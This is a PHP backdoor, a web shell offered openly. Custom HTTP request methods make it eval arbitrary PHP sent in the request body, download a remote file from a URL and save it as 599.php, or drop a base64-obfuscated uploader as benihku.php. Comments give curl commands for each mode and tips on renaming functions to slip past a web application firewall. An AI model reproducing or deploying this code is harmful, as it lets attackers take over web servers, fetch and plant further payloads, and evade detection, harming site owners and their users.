<?php
/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                      Simple Backdoor with a custom request method                                  //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
# [    SAYANGKAMU    ]      = for input php code without '<?php' and '?>'
# * example with params     = SayangKamu=echo "kamu siapa?";
# * example with curl       = curl -X SAYANGKAMU urldomain/path/filename.ext -d 'SayangKamu=echo "kamu siapa?"; '
# [    SAYANG599     ]      = for input shell by url  
# * example with params     = SAYANG599=http://ase.de/kont.ol
# * example with curl       = curl -X SAYANG599DONG urldomain/path/filename.ext -d 'SAYANG599=http://ase.de/kont.ol'
# * filename if use SAYANG599 599.php
# [ SAYANGAKUMASUKIN ]      = for add uploader in site
# * example with params     = ( this not use param ~.~ )
# * example with curl       = curl -X SAYANGAKUMASUKIN urldomain/path/filename.ext 
# * filename if use SAYANGAKUMASUKIN benihku.php
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
# If have blocked by server when u upload this file custom the function like evil or another is detect by WAF 
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
# Don't need to care about my code, because honestly  ... I can't write code
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
# Thanks for all my "!FriendS".
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/
if($_SERVER['REQUEST_METHOD'] == 'SAYANGKAMU') {
    parse_str(file_get_contents("php://input"),$SayangKamu);
    eval($SayangKamu['SayangKamu']);
}
elseif($_SERVER['REQUEST_METHOD'] == 'SAYANG599') {
    parse_str(file_get_contents("php://input"),$limasembilansembilan);
    echo fwrite(fopen("599.php","w+"),file_get_contents($limasembilansembilan['SAYANG599'])); 
   }
elseif($_SERVER['REQUEST_METHOD'] == 'SAYANGAKUMASUKIN') {
	echo file_put_contents("benihku.php",'
	<?php eval(base64_decode(\'ZWNobyAiPGZvcm0gYWN0aW9uPVwiXCIgbWV0aG9kPVwicG9zdFwiIGVuY3R5cGU9XCJtdWx0aXBhcnQvZm9ybS1kYXRhXCIgbmFtZT1cInVwbG9hZGVyXCIgaWQ9XCJ1cGxvYWRlclwiPiI7CmVjaG8gIjxpbnB1dCB0eXBlPVwiZmlsZVwiIG5hbWU9XCJmaWxlXCIgc2l6ZT1cIjUwXCI+PGlucHV0IG5hbWU9XCJfdXBsXCIgdHlwZT1cInN1Ym1pdFwiIGlkPVwiX3VwbFwiIHZhbHVlPVwiVXBsb2FkXCI+PC9mb3JtPiI7CmlmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApe2lmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKXsgCmVjaG8gJy4vJzsgfWVsc2V7IGVjaG8gJ3gnOyAJfX0=\')); ?>
	');
}
